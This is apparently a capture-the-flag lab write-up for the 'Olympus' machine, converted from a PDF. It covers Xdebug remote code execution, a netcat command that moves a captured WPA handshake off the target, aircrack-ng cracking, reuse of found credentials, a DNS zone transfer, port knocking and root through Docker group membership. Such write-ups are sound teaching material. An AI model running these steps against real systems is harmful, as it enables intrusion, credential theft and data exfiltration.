# Olympus

*Converted from: Olympus.pdf*

---

# Olympus
## **22 [nd] September 2018 / Document No D18.100.18**

**Prepared By: Alexander Reid (Arrexel)**

**Machine Author: OscarAkaElvis**

**Difficulty: Medium**

**Classification: Official**


Page 1 / 7


## **SYNOPSIS**

Olympia is not overly difficult, however there are many steps involved in getting access to the

main system. There is a heavy focus on the use of Docker, with a variety of topics and techniques

along the way.


## **Skills Required**


  - Intermediate knowledge of Linux

  - Basic understanding of Docker


## **Skills Learned**


  - Exploiting Xdebug

  - Identifying Docker instances

  - Cracking WPA handshakes

  - Gathering information through zone

transfers

  - Abusing Docker permissions


Page 2 / 7


## **Enumeration** **Nmap**

Nmap finds several open ports. As port 22 is filtered, and there is a secondary SSH service, there

is potentially a container system such as docker running on the target.


Page 3 / 7


​


​

​

​

​


## **Exploitation** **Xdebug**

Exploit: [https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce​](https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce)


Looking at the HTTP headers reveals Xdebug 2.5.5 is running on the target, which has a remote

code execution vulnerability. Using the above exploit, an initial shell is achieved.


​

​

​

​



​


​

​

​

​



​


The presence of the file **/.dockerenv** ​ suggests that the shell is inside a Docker container. A bit of

​

​

​



​


​

searching around the filesystem reveals a **captured.cap** ​ file in the airgeddon installation at

​

​



​


​

​

**/home/zeus**, which can be transferred by running **nc -lp 1235 > captured.cap** ​ on the attacking

​



​


​

​

​

machine and **nc -w 3 LAB_IP 1235 < captured.cap** ​ on the target.



​


​

​

​

​



​


​

​

​

​


Page 4 / 7


​ ​

​


## **Aircrack-ng**

Running **aircrack-ng captured.cap** ​ reveals an ESSID of ​ **Too_cl0se_to_th3_Sun** . Attempting to

crack the WPA password outputs **flightoficarus** ​ .


A bit of guesswork is involved in the next step. Using the credentials

**icarus:Too_cl0se_to_th3_Sun** it is possible to connect via SSH to the service on port 2222.

Checking the root directory reveals it is another Docker container.


Page 5 / 7



​ ​

​



​ ​

​



​ ​

​


​ ​

​


​


## **Zone Transfer & Port Knocking**

​ ​

​


​



Checking the file **help_of_the_gods.txt** ​ on the new container finds a **ctfolympus.htb** ​ domain.

​


​



​ ​

Attempting a zone transfer with **dig axfr @10.10.10.83 ctfolympus.htb** ​ outputs several integers


​



​ ​

​

and what appears to be a username (prometheus) and password (St34l_th3_F1re!).


​



​ ​

​


​



​ ​

​


Port knocking 3456, 8234 and 62431 will open the SSH service on port 22 for 10 seconds,

allowing for access as the **prometheus** ​ user.


Page 6 / 7



​ ​

​


​


​ ​ ​


​ ​


## **Privilege Escalation** **Docker Privileges**

Running **id** ​ reveals that the **prometheus** ​ user is part of the **docker** ​ group. As Docker requires root

permissions, it is possible to leverage this to mount the filesystem in a container and execute

commands as root.


Running **docker images --all** ​ lists available images on the system. Using the **olympia** ​ image, root

access is achieved.


Page 7 / 7



​ ​ ​


​ ​



​ ​ ​


​ ​


